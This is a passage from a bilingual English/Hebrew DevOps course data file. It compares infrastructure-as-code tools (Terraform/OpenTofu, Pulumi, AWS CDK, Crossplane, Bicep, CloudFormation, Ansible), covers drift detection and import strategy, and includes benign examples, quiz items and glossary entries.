<tr><th></th><th>Terraform (HashiCorp/IBM)</th><th>OpenTofu (Linux Foundation)</th></tr>
<tr><td>רישיון</td><td>BSL 1.1</td><td>MPL 2.0</td></tr>
<tr><td>אקוסיסטם</td><td>HCP Terraform, Stacks, Sentinel, registry.terraform.io</td><td>registry.opentofu.org משקף את אותם providers</td></tr>
<tr><td>Features בולטים</td><td>ephemeral resources, write-only attributes, Terraform Stacks</td><td>הצפנת state מובנית (1.7), <code>for_each</code> על providers, <code>-exclude</code>, הערכה מוקדמת של משתנים ב-backends ובמקורות של modules</td></tr>
<tr><td>מיגרציה</td><td colspan="2">drop-in ל-configs של 1.5.x/1.6.x: <code>tofu init</code> קורא את אותו state; ה-features שמתפצלים הופכים את החזרה לקשה יותר עם הזמן</td></tr>
</table>
<p>שניהם משתמשים באותם providers (ה-providers של AWS, Azure ו-Google הם MPL), באותו HCL ובאותו פורמט state בנקודת ה-fork.</p>
<blockquote>💡 Real world: צוותים שבונים מוצר platform פנימי מעל Terraform, או רוצים הצפנת state בלי backend מסחרי, נוטים לבחור OpenTofu; צוותים על HCP Terraform עם policies של Sentinel נוטים להישאר. בכל מקרה, תנעל את גרסת הבינארי ב-CI (<code>required_version</code>) — אף פעם לא לתת ללפטופים ול-pipelines להריץ גרסאות שונות.</blockquote>`
      }
    },
    {
      h: { en: "Code-first: Pulumi, AWS CDK, and what happened to CDKTF", he: "Code-first: Pulumi, AWS CDK, ומה קרה ל-CDKTF" },
      body: {
        en: `<p><strong>Pulumi</strong> (Apache 2.0) lets you declare infrastructure in TypeScript, Python, Go, C#, Java or YAML. The program builds a desired-state graph; the engine diffs it against state (Pulumi Cloud, or self-managed in S3/Azure Blob/GCS) and calls providers — many are bridged from Terraform providers, so coverage is similar.</p>
<pre>import * as aws from "@pulumi/aws";
const envs = ["dev", "staging", "prod"];
for (const env of envs) {
  new aws.s3.BucketV2(\`logs-\${env}\`, {
    tags: { env, owner: "platform" },
    forceDestroy: env !== "prod",
  });
}
// pulumi preview  -&gt; plan;  pulumi up -&gt; apply</pre>
<p>Strengths: real loops, types, unit tests, IDE autocomplete, packages for sharing abstractions. Risk: "real code" invites cleverness — a 600-line class hierarchy is harder to review than flat HCL. Keep programs declarative and boring.</p>
<p><strong>AWS CDK</strong> synthesizes <strong>CloudFormation</strong> templates from TS/Python/Java/C#/Go. L1 constructs map 1:1 to CloudFormation resources; L2 add sane defaults (an <code>s3.Bucket</code> with encryption and a removal policy); L3 "patterns" build whole stacks (an ALB + Fargate service). State lives in CloudFormation, so there is no state file to manage — but you inherit CloudFormation's speed and limits (500 resources per stack).</p>
<p><strong>CDK for Terraform (CDKTF)</strong> was deprecated by HashiCorp and archived in December 2025; don't start new projects on it. Teams that want code-first on Terraform providers usually move to Pulumi, or synthesize to plain HCL/JSON and stay on Terraform/OpenTofu.</p>`,
        he: `<p><strong>Pulumi</strong> (Apache 2.0) נותן להגדיר תשתית ב-TypeScript, Python, Go, C#, Java או YAML. התוכנית בונה גרף של desired state; המנוע משווה אותו ל-state (ב-Pulumi Cloud, או self-managed ב-S3/Azure Blob/GCS) וקורא ל-providers — הרבה מהם עטופים מ-providers של Terraform, אז הכיסוי דומה.</p>
<pre>import * as aws from "@pulumi/aws";
const envs = ["dev", "staging", "prod"];
for (const env of envs) {
  new aws.s3.BucketV2(\`logs-\${env}\`, {
    tags: { env, owner: "platform" },
    forceDestroy: env !== "prod",
  });
}
// pulumi preview  -&gt; plan;  pulumi up -&gt; apply</pre>
<p>חוזקות: לולאות אמיתיות, types, unit tests, השלמה אוטומטית ב-IDE, packages לשיתוף אבסטרקציות. הסיכון: "קוד אמיתי" מזמין התחכמות — היררכיית classes של 600 שורות קשה יותר ל-review מ-HCL שטוח. תשמור על התוכניות דקלרטיביות ומשעממות.</p>
<p><strong>AWS CDK</strong> מייצר templates של <strong>CloudFormation</strong> מ-TS/Python/Java/C#/Go. Constructs ברמה L1 ממופים 1:1 ל-resources של CloudFormation; L2 מוסיפים ברירות מחדל שפויות (<code>s3.Bucket</code> עם הצפנה ו-removal policy); L3 הם "patterns" שבונים stacks שלמים (ALB ועוד שירות Fargate). ה-state חי ב-CloudFormation, אז אין קובץ state לנהל — אבל יורשים את המהירות והמגבלות של CloudFormation (500 resources ל-stack).</p>
<p><strong>CDK for Terraform (CDKTF)</strong> סומן כ-deprecated ע"י HashiCorp ועבר ל-archive בדצמבר 2025; לא מתחילים עליו פרויקטים חדשים. צוותים שרוצים code-first על providers של Terraform עוברים בדרך כלל ל-Pulumi, או מייצרים HCL/JSON רגיל ונשארים על Terraform/OpenTofu.</p>`
      }
    },
    {
      h: { en: "Crossplane, Bicep/ARM and CloudFormation: no plan file, different reconcilers", he: "Crossplane, Bicep/ARM ו-CloudFormation: בלי קובץ plan, reconcilers אחרים" },
      body: {
        en: `<p><strong>Crossplane</strong> (CNCF) turns a Kubernetes cluster into a control plane for cloud resources. Providers install CRDs (<code>Bucket</code>, <code>RDSInstance</code>, <code>VirtualNetwork</code>); controllers reconcile them continuously, so drift is corrected within minutes without anyone running apply. Platform teams publish their own API with a <strong>CompositeResourceDefinition (XRD)</strong> and a <strong>Composition</strong> (implemented by composition functions), so an app team writes:</p>
<pre>apiVersion: platform.acme.io/v1alpha1
kind: PostgresDatabase
metadata:
  name: orders-db
  namespace: orders
spec:
  size: medium          # platform maps this to db.r6g.large, 200 GiB gp3, Multi-AZ
  version: "16"</pre>
<p>…and gets an RDS instance, subnet group, security group and a connection Secret. Strengths: one API (kubectl, Argo CD, RBAC, admission policies) for apps and infra, continuous reconciliation. Costs: you now run a critical control plane, there is no reviewable "plan" before changes, and debugging means reading controller events and conditions. Crossplane v2 (2025) made composite resources namespaced and allowed composing any Kubernetes resource, not just cloud ones.</p>
<p><strong>Bicep</strong> is Azure's DSL that compiles to <strong>ARM</strong> JSON. There is no state file: Azure Resource Manager itself is the source of truth. <code>az deployment group what-if</code> is the plan; <strong>deployment stacks</strong> add managed deletion and deny-assignments that block out-of-band changes. Best choice for Azure-only shops; useless elsewhere.</p>
<pre>resource sa 'Microsoft.Storage/storageAccounts@2023-05-01' = {
  name: 'acmelogs\${uniqueString(resourceGroup().id)}'
  location: resourceGroup().location
  sku: { name: 'Standard_ZRS' }
  kind: 'StorageV2'
  properties: { minimumTlsVersion: 'TLS1_2', allowBlobPublicAccess: false }
}
// az deployment group what-if -g rg-logs -f main.bicep</pre>
<p><strong>CloudFormation</strong> is the AWS equivalent: AWS keeps the state, <strong>change sets</strong> are the plan, built-in drift detection, StackSets for multi-account rollout. Slower and AWS-only, but nothing to host and first-day support for some new AWS features.</p>`,
        he: `<p><strong>Crossplane</strong> (CNCF) הופך cluster של Kubernetes ל-control plane למשאבי ענן. Providers מתקינים CRDs (<code>Bucket</code>, <code>RDSInstance</code>, <code>VirtualNetwork</code>); controllers עושים להם reconcile ברציפות, כך ש-drift מתוקן תוך דקות בלי שאף אחד מריץ apply. צוותי platform מפרסמים API משלהם עם <strong>CompositeResourceDefinition (XRD)</strong> ו-<strong>Composition</strong> (שממומש ע"י composition functions), כך שצוות אפליקציה כותב:</p>
<pre>apiVersion: platform.acme.io/v1alpha1
kind: PostgresDatabase
metadata:
  name: orders-db
  namespace: orders
spec:
  size: medium          # platform maps this to db.r6g.large, 200 GiB gp3, Multi-AZ
  version: "16"</pre>
<p>…ומקבל RDS instance, subnet group, security group ו-Secret עם פרטי החיבור. חוזקות: API אחד (kubectl, Argo CD, RBAC, admission policies) לאפליקציות ולתשתית, ו-reconcile רציף. מחירים: אתה מריץ עכשיו control plane קריטי, אין "plan" שאפשר לעבור עליו לפני שינוי, ו-debug אומר לקרוא events ו-conditions של controllers. Crossplane v2 (2025) הפך composite resources ל-namespaced ואפשר להרכיב כל resource של Kubernetes, לא רק משאבי ענן.</p>
<p><strong>Bicep</strong> היא ה-DSL של Azure שמתקמפלת ל-JSON של <strong>ARM</strong>. אין קובץ state: ה-Azure Resource Manager עצמו הוא מקור האמת. <code>az deployment group what-if</code> הוא ה-plan; <strong>deployment stacks</strong> מוסיפים מחיקה מנוהלת ו-deny-assignments שחוסמים שינויים מחוץ לתהליך. הבחירה הכי טובה לארגונים שהם רק Azure; חסר תועלת בכל מקום אחר.</p>
<pre>resource sa 'Microsoft.Storage/storageAccounts@2023-05-01' = {
  name: 'acmelogs\${uniqueString(resourceGroup().id)}'
  location: resourceGroup().location
  sku: { name: 'Standard_ZRS' }
  kind: 'StorageV2'
  properties: { minimumTlsVersion: 'TLS1_2', allowBlobPublicAccess: false }
}
// az deployment group what-if -g rg-logs -f main.bicep</pre>
<p><strong>CloudFormation</strong> הוא המקבילה ב-AWS: AWS מחזיקים את ה-state, <strong>change sets</strong> הם ה-plan, יש זיהוי drift מובנה, ו-StackSets לפריסה על הרבה accounts. איטי יותר ורק AWS, אבל אין מה לארח ויש תמיכה מהיום הראשון בחלק מה-features החדשים של AWS.</p>`
      }
    },
    {
      h: { en: "Provisioning vs configuration management (Ansible), and GitOps for infra", he: "Provisioning מול configuration management (Ansible), ו-GitOps לתשתית" },
      body: {
        en: `<p><strong>Provisioning</strong> creates cloud resources (VPCs, clusters, databases, IAM). <strong>Configuration management</strong> configures what runs inside an existing machine (packages, files, users, services). <strong>Ansible</strong> is agentless (SSH/WinRM), push-based, with idempotent modules:</p>
<pre>- hosts: db_servers
  become: true
  tasks:
    - name: Install chrony
      ansible.builtin.package: { name: chrony, state: present }
    - name: Configure NTP servers
      ansible.builtin.template: { src: chrony.conf.j2, dest: /etc/chrony.conf, mode: "0644" }
      notify: restart chrony
  handlers:
    - name: restart chrony
      ansible.builtin.service: { name: chronyd, state: restarted }
# ansible-playbook -i inventory/prod site.yml --check --diff   (dry run)</pre>
<p>Ansible <em>can</em> create cloud resources, but it has no state and no plan, so deletions and drift are on you — use Terraform/OpenTofu for that. Chef and Puppet are agent-based, pull-based alternatives, now mostly in legacy fleets. In a world of containers and <strong>immutable images</strong> (Packer-built AMIs, cloud-init, Kubernetes), most config management moved into the image build; Ansible remains strong for VMs, network devices, on-prem and day-2 operations.</p>
<p><strong>GitOps for infrastructure</strong> means the main branch is the desired state and every change is a PR with a plan attached:</p>
<ul>
<li><strong>PR automation</strong>: Atlantis (self-hosted; comments <code>tofu plan</code> output on the PR, <code>atlantis apply</code> after approval), HCP Terraform, Spacelift, env0, Terrateam, Digger.</li>
<li><strong>Pull-based</strong>: Flux's tofu-controller reconciles Terraform/OpenTofu from git; Crossplane + Argo CD makes infra just more Kubernetes manifests.</li>
<li><strong>Policy as code</strong> on the plan: OPA/Conftest, Checkov, Trivy, or Sentinel — block public buckets, untagged resources, or a plan that destroys a database.</li>
</ul>`,
        he: `<p><strong>Provisioning</strong> יוצר משאבי ענן (VPCs, clusters, מסדי נתונים, IAM). <strong>Configuration management</strong> מגדיר מה רץ בתוך מכונה קיימת (packages, קבצים, משתמשים, services). <strong>Ansible</strong> הוא agentless (SSH/WinRM), עובד ב-push, עם modules שהם idempotent:</p>
<pre>- hosts: db_servers
  become: true
  tasks:
    - name: Install chrony
      ansible.builtin.package: { name: chrony, state: present }
    - name: Configure NTP servers
      ansible.builtin.template: { src: chrony.conf.j2, dest: /etc/chrony.conf, mode: "0644" }
      notify: restart chrony
  handlers:
    - name: restart chrony
      ansible.builtin.service: { name: chronyd, state: restarted }
# ansible-playbook -i inventory/prod site.yml --check --diff   (dry run)</pre>
<p>Ansible <em>יכול</em> ליצור משאבי ענן, אבל אין לו state ואין לו plan, אז מחיקות ו-drift עליך — לזה משתמשים ב-Terraform/OpenTofu. Chef ו-Puppet הם חלופות מבוססות agent שעובדות ב-pull, והיום נמצאות בעיקר בצי מכונות ותיק. בעולם של containers ו-<strong>immutable images</strong> (AMIs שנבנו עם Packer, cloud-init, Kubernetes), רוב ה-configuration management עבר לשלב בניית ה-image; Ansible נשאר חזק ל-VMs, לרכיבי רשת, ל-on-prem ולתפעול day-2.</p>
<p><strong>GitOps לתשתית</strong> אומר שה-branch הראשי הוא ה-desired state וכל שינוי הוא PR עם plan מצורף:</p>
<ul>
<li><strong>אוטומציה של PR</strong>: Atlantis (self-hosted; מגיב על ה-PR עם הפלט של <code>tofu plan</code>, ו-<code>atlantis apply</code> אחרי אישור), HCP Terraform, Spacelift, env0, Terrateam, Digger.</li>
<li><strong>מבוסס pull</strong>: ה-tofu-controller של Flux עושה reconcile ל-Terraform/OpenTofu מ-git; Crossplane ביחד עם Argo CD הופכים את התשתית לעוד manifests של Kubernetes.</li>
<li><strong>Policy as code</strong> על ה-plan: OPA/Conftest, Checkov, Trivy או Sentinel — חוסמים buckets ציבוריים, משאבים בלי tags, או plan שמוחק מסד נתונים.</li>
</ul>`
      }
    },
    {
      h: { en: "Choosing per team, and drift & import strategy", he: "לבחור לפי צוות, ואסטרטגיית drift ו-import" },
      body: {
        en: `<table>
<tr><th>Situation</th><th>Reasonable default</th></tr>
<tr><td>Multi-cloud or SaaS providers (Datadog, Cloudflare, GitHub) in the same repo</td><td>Terraform or OpenTofu</td></tr>
<tr><td>Developers own their infra, strong TS/Python culture, want tests</td><td>Pulumi</td></tr>
<tr><td>AWS-only, app teams in TS/Python, want high-level constructs</td><td>AWS CDK</td></tr>
<tr><td>Azure-only</td><td>Bicep (+ deployment stacks)</td></tr>
<tr><td>Platform team offering self-service infra APIs on Kubernetes</td><td>Crossplane (often fronting Terraform-managed foundations)</td></tr>
<tr><td>Configuring VMs, network gear, on-prem</td><td>Ansible alongside a provisioning tool</td></tr>
</table>
<p>Mixing is normal: Terraform for landing zone and networking, Crossplane or Pulumi for app-level resources. What hurts is two tools managing the <em>same</em> resource.</p>
<p><strong>Drift strategy</strong>: run a scheduled plan per stack (nightly) and alert on changes:</p>
<pre>tofu plan -refresh-only -detailed-exitcode -lock=false
# exit 0 = no drift, 1 = error, 2 = drift detected -&gt; open a ticket / Slack alert</pre>
<p>Then decide per finding: <strong>revert</strong> (re-apply code), <strong>adopt</strong> (update code to match an intentional console fix), or <strong>ignore</strong> deliberately (<code>lifecycle { ignore_changes = [desired_count] }</code> for an autoscaled field). Reduce new drift by removing console write access in prod (read-only roles + break-glass).</p>
<p><strong>Import strategy</strong> for ClickOps estates: import blocks plus generated config (Terraform ≥1.5, OpenTofu), one bounded area at a time, until <code>plan</code> shows no changes:</p>
<pre>import {
  to = aws_s3_bucket.logs
  id = "acme-prod-logs"
}
# tofu plan -generate-config-out=generated.tf   -&gt; review, clean up, commit</pre>
<p>Bulk helpers: <code>aztfexport</code> (Azure, official), Former2 or Terraformer-style exporters for AWS/GCP, and <code>pulumi import</code> / <code>pulumi convert --from terraform</code> for Pulumi. Generated code is a starting point: rename resources, extract variables and modules before it becomes the thing everyone copies.</p>
<blockquote>⚠️ Production tip: the riskiest moment in an import is the first <code>apply</code>. Require a plan with zero changes (or only tag additions) before merging an import PR — a "harmless" in-place update on an imported RDS instance can trigger a reboot.</blockquote>`,
        he: `<table>
<tr><th>מצב</th><th>ברירת מחדל סבירה</th></tr>
<tr><td>Multi-cloud או providers של SaaS (Datadog, Cloudflare, GitHub) באותו repo</td><td>Terraform או OpenTofu</td></tr>
<tr><td>המפתחים אחראים לתשתית שלהם, תרבות חזקה של TS/Python, רוצים טסטים</td><td>Pulumi</td></tr>
<tr><td>רק AWS, צוותי אפליקציה ב-TS/Python, רוצים constructs ברמה גבוהה</td><td>AWS CDK</td></tr>
<tr><td>רק Azure</td><td>Bicep (+ deployment stacks)</td></tr>
<tr><td>צוות platform שמציע APIs של self-service לתשתית על Kubernetes</td><td>Crossplane (הרבה פעמים מעל יסודות שמנוהלים ב-Terraform)</td></tr>
<tr><td>הגדרת VMs, רכיבי רשת, on-prem</td><td>Ansible לצד כלי provisioning</td></tr>
</table>
<p>שילוב בין כלים זה נורמלי: Terraform ל-landing zone ולרשת, Crossplane או Pulumi למשאבים ברמת האפליקציה. מה שכואב זה שני כלים שמנהלים את <em>אותו</em> משאב.</p>
<p><strong>אסטרטגיית drift</strong>: מריצים plan מתוזמן לכל stack (כל לילה) ומתריעים על שינויים:</p>
<pre>tofu plan -refresh-only -detailed-exitcode -lock=false
# exit 0 = no drift, 1 = error, 2 = drift detected -&gt; open a ticket / Slack alert</pre>
<p>ואז מחליטים לכל ממצא: <strong>revert</strong> (להחיל שוב את הקוד), <strong>adopt</strong> (לעדכן את הקוד כך שיתאים לתיקון מכוון שנעשה ב-console), או <strong>ignore</strong> בכוונה (<code>lifecycle { ignore_changes = [desired_count] }</code> לשדה שמנוהל ע"י autoscaling). מצמצמים drift חדש ע"י הסרת הרשאות כתיבה ב-console בפרוד (roles של read-only ועוד break-glass).</p>
<p><strong>אסטרטגיית import</strong> לסביבות שנבנו ב-ClickOps: import blocks ועוד config שנוצר אוטומטית (Terraform 1.5 ומעלה, OpenTofu), אזור מוגדר אחד בכל פעם, עד ש-<code>plan</code> לא מראה שינויים:</p>
<pre>import {
  to = aws_s3_bucket.logs
  id = "acme-prod-logs"
}
# tofu plan -generate-config-out=generated.tf   -&gt; review, clean up, commit</pre>
<p>כלים ל-import בכמויות: <code>aztfexport</code> (Azure, רשמי), Former2 או exporters בסגנון Terraformer ל-AWS/GCP, ו-<code>pulumi import</code> או <code>pulumi convert --from terraform</code> ל-Pulumi. קוד שנוצר אוטומטית הוא נקודת התחלה: משנים שמות ל-resources, מוציאים variables ו-modules לפני שהוא הופך למה שכולם מעתיקים.</p>
<blockquote>⚠️ Production tip: הרגע הכי מסוכן ב-import הוא ה-<code>apply</code> הראשון. תדרוש plan עם אפס שינויים (או רק הוספת tags) לפני merge של PR של import — עדכון in-place "תמים" על RDS instance שעבר import יכול לגרום ל-reboot.</blockquote>`
      }
    }
  ],
  diagram: "        desired state                     reconcile model\nHCL  -> Terraform/OpenTofu -> state file -> plan/apply (on demand, in CI)\nTS/Py -> Pulumi            -> state      -> preview/up\nTS/Py -> AWS CDK -> CloudFormation (AWS holds state) -> change set\nBicep -> ARM (Azure holds state)          -> what-if / deployment stack\nYAML CR -> Crossplane controllers (k8s)   -> continuous reconcile, drift auto-fixed\nAnsible playbook -> SSH into hosts        -> idempotent tasks, no state",
  handsOn: [
    { cmd: "tofu init -upgrade && tofu plan -refresh-only -detailed-exitcode; echo \"exit=$?\"", what: { en: "Check a stack for drift without changing anything; exit code 2 means reality differs from state.", he: "לבדוק stack ל-drift בלי לשנות כלום; exit code 2 אומר שהמציאות שונה מה-state." } },
    { cmd: "tofu plan -generate-config-out=generated.tf", what: { en: "With import blocks in place, generate HCL for existing resources as a starting point.", he: "עם import blocks במקום, לייצר HCL למשאבים קיימים כנקודת התחלה." } },
    { cmd: "az deployment group what-if -g rg-logs -f main.bicep", what: { en: "Preview what a Bicep deployment would create, modify or delete in a resource group.", he: "לראות מראש מה deploy של Bicep היה יוצר, משנה או מוחק ב-resource group." } },
    { cmd: "kubectl get managed && kubectl describe postgresdatabase orders-db -n orders", what: { en: "List all Crossplane managed resources and inspect a composite's conditions (Synced/Ready) and events.", he: "להציג את כל ה-managed resources של Crossplane ולבדוק את ה-conditions (Synced/Ready) וה-events של composite." } },
    { cmd: "ansible-playbook -i inventory/prod site.yml --check --diff --limit db01", what: { en: "Dry-run a playbook against one host and see exactly which files would change.", he: "להריץ playbook ב-dry-run מול host אחד ולראות בדיוק אילו קבצים ישתנו." } }
  ],
  mnemonic: {
    en: "Who writes it, who holds state, who reconciles: HCL+file+you (TF/Tofu), code+file+you (Pulumi), cloud holds it (CDK/Bicep), controller never sleeps (Crossplane), Ansible lives inside the box.",
    he: "מי כותב, מי מחזיק state, מי עושה reconcile: HCL+קובץ+אתה (TF/Tofu), קוד+קובץ+אתה (Pulumi), הענן מחזיק (CDK/Bicep), ה-controller אף פעם לא ישן (Crossplane), ו-Ansible גר בתוך הקופסה."
  },
  pitfalls: [
    { en: "Two tools managing the same resource (Terraform creates the bucket, Crossplane or a console script edits its policy): they fight forever and each 'fixes' the other's drift.", he: "שני כלים שמנהלים את אותו משאב (Terraform יוצר את ה-bucket, ו-Crossplane או סקריפט ב-console משנים לו את ה-policy): הם נלחמים לנצח וכל אחד 'מתקן' את ה-drift של השני." },
    { en: "Switching Terraform → OpenTofu mid-flight with different binaries in CI and on laptops: state written by newer features may not be readable by the other tool.", he: "לעבור מ-Terraform ל-OpenTofu באמצע עם בינארים שונים ב-CI ובלפטופים: state שנכתב עם features חדשים יותר אולי לא יהיה קריא לכלי השני." },
    { en: "Using Ansible to provision cloud resources at scale: no state means removed tasks don't delete anything and nobody knows what exists.", he: "להשתמש ב-Ansible כדי לעשות provisioning למשאבי ענן בסקייל: בלי state, tasks שהוסרו לא מוחקים כלום ואף אחד לא יודע מה קיים." },
    { en: "Treating generated import code as final — it hardcodes IDs and every default attribute, and becomes unreadable boilerplate that teams copy.", he: "להתייחס לקוד import שנוצר אוטומטית כסופי — הוא מקודד IDs וכל attribute של ברירת מחדל, והופך ל-boilerplate לא קריא שצוותים מעתיקים." }
  ],
  interview: [
    {
      q: { en: "Terraform/OpenTofu or Crossplane for a platform team offering databases to 40 product teams?", he: "Terraform/OpenTofu או Crossplane לצוות platform שמציע מסדי נתונים ל-40 צוותי מוצר?" },
      a: { en: "Often both. Foundations (accounts, VPCs, cluster, IAM boundaries) change rarely and benefit from reviewable plans — Terraform/OpenTofu with PR automation. Per-team databases are a self-service product: a Crossplane XRD like PostgresDatabase gives teams a small, opinionated API through the same GitOps flow as their apps, with continuous drift correction. The cost is operating Crossplane as a critical control plane and losing a pre-apply plan, so test compositions carefully and protect deletions.", he: "הרבה פעמים שניהם. היסודות (accounts, VPCs, cluster, גבולות IAM) משתנים לעתים רחוקות ונהנים מ-plans שאפשר לעבור עליהם — Terraform/OpenTofu עם אוטומציה של PR-ים. מסד נתונים לכל צוות הוא מוצר self-service: XRD של Crossplane כמו PostgresDatabase נותן לצוותים API קטן ודעתני דרך אותו flow של GitOps כמו האפליקציות שלהם, עם תיקון drift רציף. המחיר הוא להפעיל את Crossplane כ-control plane קריטי ולוותר על plan לפני apply, אז בודקים compositions בקפידה ומגנים על מחיקות." }
    },
    {
      q: { en: "You inherit an AWS account built by hand with 300 resources. How do you bring it under IaC?", he: "קיבלת account של AWS שנבנה ביד עם 300 משאבים. איך מכניסים אותו ל-IaC?" },
      a: { en: "Inventory first (Resource Explorer/Config), group by blast radius (network, data, compute), and import one group at a time using import blocks plus -generate-config-out. Clean up the generated code, then require a zero-change plan before merging each import. Lock console write access in prod as areas are adopted, and add nightly refresh-only drift detection so it stays adopted.", he: "קודם מלאי (Resource Explorer/Config), חלוקה לקבוצות לפי blast radius (רשת, דאטה, compute), ו-import של קבוצה אחת בכל פעם עם import blocks והדגל <code>-generate-config-out</code>. מנקים את הקוד שנוצר, ואז דורשים plan עם אפס שינויים לפני merge של כל import. נועלים הרשאות כתיבה ב-console בפרוד ככל שאזורים עוברים לניהול בקוד, ומוסיפים זיהוי drift לילי עם refresh-only כדי שזה יישאר ככה." }
    }
  ],
  quiz: [
    {
      q: { en: "What changed when Terraform moved to the BSL in 2023?", he: "מה השתנה כש-Terraform עבר ל-BSL ב-2023?" },
      options: [
        { en: "Terraform became paid for all users", he: "Terraform הפך לבתשלום לכל המשתמשים" },
        { en: "Use stayed free, but offering a product competing with HashiCorp is restricted; OpenTofu forked the last MPL version", he: "השימוש נשאר חינם, אבל להציע מוצר שמתחרה ב-HashiCorp מוגבל; OpenTofu עשה fork לגרסת ה-MPL האחרונה" },
        { en: "All providers were relicensed and stopped working with forks", he: "כל ה-providers קיבלו רישיון חדש והפסיקו לעבוד עם forks" },
        { en: "HCL was replaced by YAML", he: "HCL הוחלף ב-YAML" }
      ],
      answer: 1,
      explain: { en: "The BSL restricts competitive commercial offerings, not internal use. Providers remained MPL, which is why OpenTofu works with the same providers.", he: "ה-BSL מגביל הצעות מסחריות מתחרות, לא שימוש פנימי. ה-providers נשארו MPL, ולכן OpenTofu עובד עם אותם providers." }
    },
    {
      q: { en: "Which tool corrects drift continuously without anyone running apply?", he: "איזה כלי מתקן drift ברציפות בלי שאף אחד מריץ apply?" },
      options: [
        { en: "Terraform", he: "Terraform" },
        { en: "Ansible", he: "Ansible" },
        { en: "Crossplane", he: "Crossplane" },
        { en: "Bicep", he: "Bicep" }
      ],
      answer: 2,
      explain: { en: "Crossplane runs Kubernetes controllers that reconcile managed resources in a loop. Terraform, Bicep and Ansible act only when invoked.", he: "Crossplane מריץ controllers של Kubernetes שעושים reconcile ל-managed resources בלולאה. Terraform, Bicep ו-Ansible פועלים רק כשמפעילים אותם." }
    },
    {
      q: { en: "Where is the state for an AWS CDK app?", he: "איפה ה-state של אפליקציית AWS CDK?" },
      options: [
        { en: "In a terraform.tfstate file in S3", he: "בקובץ terraform.tfstate ב-S3" },
        { en: "In CloudFormation stacks managed by AWS", he: "ב-stacks של CloudFormation שמנוהלים ע\"י AWS" },
        { en: "In Pulumi Cloud", he: "ב-Pulumi Cloud" },
        { en: "CDK has no state at all", he: "ל-CDK אין state בכלל" }
      ],
      answer: 1,
      explain: { en: "CDK synthesizes CloudFormation templates; CloudFormation tracks the deployed resources, change sets and drift.", he: "CDK מייצר templates של CloudFormation; CloudFormation עוקב אחרי המשאבים שנפרסו, change sets ו-drift." }
    },
    {
      q: { en: "tofu plan -refresh-only -detailed-exitcode returns 2. What does it mean?", he: "tofu plan -refresh-only -detailed-exitcode מחזיר 2. מה זה אומר?" },
      options: [
        { en: "The plan failed with an error", he: "ה-plan נכשל עם שגיאה" },
        { en: "No changes", he: "אין שינויים" },
        { en: "Real infrastructure differs from state — drift detected", he: "התשתית האמיתית שונה מה-state — זוהה drift" },
        { en: "The state lock is held", he: "ה-lock על ה-state תפוס" }
      ],
      answer: 2,
      explain: { en: "With -detailed-exitcode: 0 = no changes, 1 = error, 2 = changes present. With -refresh-only, those changes are drift between real resources and state.", he: "עם הדגל -detailed-exitcode: אפס = אין שינויים, 1 = שגיאה, 2 = יש שינויים. עם הדגל -refresh-only, השינויים האלה הם drift בין המשאבים האמיתיים ל-state." }
    }
  ],
  related: ["cloud-iac", "staff-terraform-at-scale", "k8s-argocd", "staff-platform-engineering", "cloud-landing-zones"]
});

/* ------------------------------------------------------------------ glossary */
[
  ["pull_request_target", "GitHub Actions trigger that runs the base branch's workflow for a PR with repo secrets and a write-capable token; dangerous if it checks out or runs the PR's code.", "Trigger של GitHub Actions שמריץ את ה-workflow מה-branch של ה-base עבור PR, עם ה-secrets של ה-repo ו-token עם הרשאות כתיבה; מסוכן אם הוא עושה checkout לקוד של ה-PR או מריץ אותו.", "cicd-github-actions"],
  ["GITHUB_TOKEN", "Short-lived token GitHub injects into every workflow job, scoped to the repo; its scopes are set with the permissions: key and it expires when the job ends.", "Token קצר-מועד ש-GitHub מזריק לכל job ב-workflow, מוגבל ל-repo; ההרשאות שלו נקבעות עם המפתח permissions: והוא פג כשה-job מסתיים.", "cicd-github-actions"],
  ["Actions Runner Controller (ARC)", "Kubernetes operator from GitHub that runs ephemeral self-hosted Actions runners as Pods and autoscales them from the job queue.", "Operator של Kubernetes מבית GitHub שמריץ runners מסוג self-hosted ו-ephemeral כ-Pods ועושה להם autoscaling לפי תור ה-jobs.", "cicd-github-actions"],
  ["Trunk-based development", "Branching model where everyone merges small changes into main at least daily, with short-lived branches and feature flags instead of long feature branches.", "מודל branching שבו כולם עושים merge לשינויים קטנים ל-main לפחות פעם ביום, עם branches קצרים ו-feature flags במקום feature branches ארוכים.", "release-engineering"],
  ["Semantic Versioning (SemVer)", "MAJOR.MINOR.PATCH versioning: MAJOR for breaking changes, MINOR for compatible features, PATCH for compatible fixes.", "שיטת גרסאות MAJOR.MINOR.PATCH: MAJOR לשינויים שוברים, MINOR ל-features תואמים, PATCH לתיקונים תואמים.", "release-engineering"],
  ["Conventional Commits", "Commit message convention (feat:, fix:, feat!:, BREAKING CHANGE:) that lets tools compute the next semver version and generate changelogs.", "קונבנציה להודעות commit (feat:, fix:, feat!:, BREAKING CHANGE:) שמאפשרת לכלים לחשב את גרסת ה-semver הבאה ולייצר changelogs.", "release-engineering"],
  ["Lead time for changes", "DORA throughput metric: time from a commit to that commit running in production; report median and p90, broken into coding, review and deploy stages.", "מדד throughput של DORA: הזמן מ-commit ועד שהוא רץ בפרוד; מדווחים חציון ו-p90, מפורק לשלבי coding, review ו-deploy.", "dora-metrics"],
  ["Change failure rate", "DORA stability metric: share of production deployments that needed remediation (rollback, hotfix or incident).", "מדד יציבות של DORA: אחוז ה-deploys לפרוד שדרשו תיקון (rollback, hotfix או incident).", "dora-metrics"],
  ["SPACE framework", "Developer productivity framework: Satisfaction, Performance, Activity, Communication & collaboration, Efficiency & flow — measure several dimensions, never activity alone.", "מסגרת לפרודוקטיביות מפתחים: Satisfaction, Performance, Activity, Communication & collaboration, Efficiency & flow — מודדים כמה ממדים, אף פעם לא רק activity.", "dora-metrics"],
  ["Crossplane", "CNCF project that turns Kubernetes into a control plane for cloud infrastructure: resources are CRDs reconciled continuously, and platform teams publish their own APIs with XRDs and Compositions.", "פרויקט CNCF שהופך את Kubernetes ל-control plane לתשתית ענן: משאבים הם CRDs שעוברים reconcile ברציפות, וצוותי platform מפרסמים APIs משלהם עם XRDs ו-Compositions.", "iac-landscape"],
  ["Pulumi", "IaC tool where infrastructure is declared in general-purpose languages (TypeScript, Python, Go, C#, Java) and diffed against state, with preview/up as plan/apply.", "כלי IaC שבו מגדירים תשתית בשפות רגילות (TypeScript, Python, Go, C#, Java) ומשווים אותה ל-state, עם preview/up בתור plan/apply.", "iac-landscape"],
